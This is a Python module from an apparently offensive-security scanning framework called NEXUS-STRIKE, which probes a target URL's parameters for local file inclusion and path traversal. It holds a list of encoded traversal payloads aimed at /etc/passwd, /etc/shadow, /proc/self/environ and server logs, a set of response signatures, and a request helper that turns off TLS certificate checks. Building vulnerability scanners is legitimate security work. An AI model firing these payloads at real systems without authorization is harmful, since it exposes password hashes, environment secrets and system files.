#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.lfi
Domain: webapp
Local File Inclusion / Path Traversal detection with signature matching.
"""
from __future__ import annotations

import re
import ssl
import urllib.request
import urllib.parse
from typing import Any

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_FAILED,
    STATUS_NO_FINDINGS,
    tool_result,
)
from nexus.tools.registry import tool_registry

USER_AGENT = "NEXUS-STRIKE/0.2.0 (LFI Detector)"

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "../../../../etc/shadow",
    "../../../../../../etc/shadow",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "../../../../proc/self/environ",
    "/proc/self/cmdline",
    "../../../../proc/self/cmdline",
    "/var/log/apache2/access.log",
    "../../../../var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "../../../../var/log/nginx/access.log",
    "/etc/hosts",
    "../../../../Windows/System32/drivers/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/os-release",
]

LFI_SIGNATURES = [
    (r"root:.*?:0:0:", "root user entry in /etc/passwd"),
    (r"daemon:.*?:1:1:", "daemon user in /etc/passwd"),
    (r"bin:.*?:1:1:", "bin user in /etc/passwd"),
    (r"/bin/bash|/bin/sh", "shell in /etc/passwd"),
    (r"Microsoft Windows|Windows Version", "Windows host file"),
    (r"127\.0\.0\.1\s+localhost", "hosts file"),
    (r"PATH=.*LD_LIBRARY_PATH", "environment variables"),
    (r"USER=.*HOME=", "environment variables"),
    (r"Apache Server Status", "Apache status"),
    (r"Ubuntu [0-9]|^Debian|^CentOS|^Alpine|^Fedora", "OS release file"),
    (r"[Aa]pache.*log|[Nn]ginx.*log", "log file access"),
    (r"failed to open stream.*include", "PHP include error"),
    (r"Warning.*include.*failed", "PHP warning"),
]


def _http_request(url: str, timeout: int = 10) -> dict:
    """Make HTTP request."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(65536).decode("utf-8", errors="replace")
        return {"status": resp.status, "body": body, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "error": None}
    except Exception as e:
        return {"status": 0, "body": "", "error": str(e)[:100]}


def run(
    target: str,
    max_params: int = 10,
    timeout: int = 10,
    **kwargs: Any,
) -> dict:
    """Perform LFI/path traversal testing.

    Parameters
    ----------
    target : str
        Target URL to test.
    max_params : int
        Maximum parameters to test.
    timeout : int
        Request timeout in seconds.
    """
    if not target or not target.strip():
        return tool_result("webapp.lfi", target, status=STATUS_FAILED, error="Empty target")

    url = target if "://" in target else f"http://{target}"
    findings: list[Finding] = []
    tested_params: list[str] = []
    vulns: list[dict] = []

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        params = {"file": "test", "page": "test", "include": "test", "path": "test", "doc": "test", "load": "test"}

    tested_params = list(params.keys())[:max_params]

    for param in tested_params:
        for payload in LFI_PAYLOADS:
            query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            query[param] = payload
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
            resp = _http_request(test_url, timeout)

            if resp["status"] and resp["status"] != 404:
                for pattern, desc in LFI_SIGNATURES:
                    if re.search(pattern, resp["body"], re.IGNORECASE):
                        vulns.append({"param": param, "payload": payload, "signature": desc})
                        findings.append(Finding(
                            title=f"LFI confirmed on parameter '{param}'",
                            severity="critical",
                            confidence="high",
                            affected_asset=url,
                            evidence=f"Payload: {payload[:50]} matched: {desc}",
                            remediation="Implement input validation and use whitelists for file access.",
                            tool="webapp.lfi",
                            references=["CWE-22", "OWASP-A01"],
                        ))
                        break

                if "failed to open stream" in resp["body"].lower():
                    vulns.append({"param": param, "payload": payload, "signature": "include error"})
                    findings.append(Finding(
                        title=f"LFI indicator on parameter '{param}'",
                        severity="high",
                        confidence="medium",
                        affected_asset=url,
                        evidence=f"PHP include error with payload: {payload[:50]}",
                        remediation="Review error handling and restrict file access.",
                        tool="webapp.lfi",
                        references=["CWE-22", "OWASP-A01"],
                    ))

            if vulns:
                break

        if vulns:
            break

    summary = f"LFI testing completed on {len(tested_params)} parameters"
    if vulns:
        summary += f" - {len(vulns)} vulnerabilities found"

    return tool_result(
        "webapp.lfi", target,
        status=STATUS_COMPLETED if vulns else STATUS_NO_FINDINGS,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vulns, "tested_params": tested_params},
    )


tool_registry.register("webapp.lfi", run, metadata={
    "name": "webapp.lfi",
    "domain": "webapp",
    "status": "completed",
    "description": "LFI/Path Traversal detection with signature matching",
    "parameters": {
        "target": "Target URL to test",
        "max_params": "Maximum parameters to test (default: 10)",
        "timeout": "Request timeout in seconds (default: 10)",
    },
})